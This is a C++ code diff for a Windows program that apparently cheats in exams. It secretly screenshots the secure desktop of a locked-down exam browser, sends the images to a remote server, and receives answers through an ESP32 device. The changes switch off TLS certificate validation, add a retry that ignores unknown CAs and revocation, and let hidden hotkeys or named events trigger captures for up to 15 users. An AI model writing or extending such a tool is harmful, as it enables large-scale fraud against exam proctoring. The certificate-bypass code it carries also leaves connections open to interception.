@@ -173,7 +173,8 @@ void UploadToCloud(const std::vector<uint8_t>& jpegData, int user_id) {
     if (!hSession) return;
     HINTERNET hConnect = InternetConnectA(hSession, "exam-system-v1.onrender.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) { InternetCloseHandle(hSession); return; }
-    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
+    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, 
+        INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
     if (!hRequest) { InternetCloseHandle(hConnect); InternetCloseHandle(hSession); return; }
     
     std::string boundary = "----BoundaryGhostMode";
@@ -192,12 +193,24 @@ void UploadToCloud(const std::vector<uint8_t>& jpegData, int user_id) {
         // Success - server will queue the answer for ESP32
         Beep(1000, 100); 
     } else {
-        Beep(200, 500); // Error
+        DWORD err = GetLastError();
+        // If it's a certificate error, try to ignore it
+        if (err == ERROR_INTERNET_INVALID_CA || err == 12045) {
+            DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION | SECURITY_FLAG_IGNORE_WRONG_USAGE;
+            InternetSetOptionA(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+            if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)fullBody.data(), (DWORD)fullBody.size())) {
+                Beep(1000, 100); 
+                InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
+                return;
+            }
+        }
+        Beep(200, 800); // Long low beep for upload error
     }
     InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hSession);
 }
 
 void CaptureThreadFunc(int user_id) {
+    Beep(1500, 50); // Beep: Capture Triggered
     HDESK hInput = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
     HDESK hOriginal = GetThreadDesktop(GetCurrentThreadId());
     if (hInput) SetThreadDesktop(hInput);
@@ -217,7 +230,10 @@ void CaptureThreadFunc(int user_id) {
             };
             std::vector<uint8_t> jpegBuffer;
             stbi_write_jpg_to_func(write_func, &jpegBuffer, w, h, 4, pixels.data(), 80);
-            if (!jpegBuffer.empty()) UploadToCloud(jpegBuffer, user_id);
+            if (!jpegBuffer.empty()) {
+                Beep(1800, 50); // Beep: Capture Success, Starting Upload
+                UploadToCloud(jpegBuffer, user_id);
+            }
         }
         SelectObject(memdc, oldbmp); DeleteObject(hbmp); DeleteDC(memdc); ReleaseDC(NULL, hdc);
     }
@@ -231,12 +247,23 @@ int main() {
     SECURITY_DESCRIPTOR sd; InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
     SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
     SECURITY_ATTRIBUTES sa; sa.nLength = sizeof(SECURITY_ATTRIBUTES); sa.lpSecurityDescriptor = &sd;
-    HANDLE hEvent = CreateEventA(&sa, FALSE, FALSE, "Global\\SEB_Capture_Trigger");
+    
+    HANDLE hEvents[15];
+    for (int i = 0; i < 15; i++) {
+        std::string eventName = "Global\\SEB_Capture_Trigger_" + std::to_string(i + 1);
+        hEvents[i] = CreateEventA(&sa, FALSE, FALSE, eventName.c_str());
+    }
     
     while (true) {
         CheckAndInject();
         
         if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && (GetAsyncKeyState(VK_SHIFT) & 0x8000)) {
+            // Ctrl+Shift+X = quick capture for User 1 (backward compat)
+            if (GetAsyncKeyState('X') & 0x8000) {
+                DoStealthCapture(1);
+                while (GetAsyncKeyState('X') & 0x8000) Sleep(100);
+            }
+            // Ctrl+Shift+A..O = multi-user capture (A=1, B=2, ..., O=15)
             for (int i = 0; i < 15; i++) {
                 char key = 'A' + i;
                 if (GetAsyncKeyState(key) & 0x8000) {
@@ -246,8 +273,10 @@ int main() {
             }
         }
         
-        if (hEvent && WaitForSingleObject(hEvent, 0) == WAIT_OBJECT_0) {
-            DoStealthCapture(1); // Default to user 1 for external trigger
+        for (int i = 0; i < 15; i++) {
+            if (hEvents[i] && WaitForSingleObject(hEvents[i], 0) == WAIT_OBJECT_0) {
+                DoStealthCapture(i + 1); // User IDs 1 to 15
+            }
         }
         Sleep(100);
     }
